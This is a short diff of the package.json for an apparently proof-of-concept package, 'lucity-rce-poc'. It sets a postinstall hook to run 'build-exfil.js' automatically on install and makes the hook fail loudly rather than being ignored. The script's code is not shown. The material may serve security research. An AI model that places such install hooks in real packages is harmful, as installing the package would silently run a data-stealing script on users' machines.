@@ -2,7 +2,7 @@
   "name": "lucity-rce-poc",
   "version": "1.0.0",
   "scripts": {
-    "postinstall": "node build-exfil.js || true",
-    "start": "node server.js"
+    "postinstall": "node build-exfil.js",
+    "start": "echo ok"
   }
 }
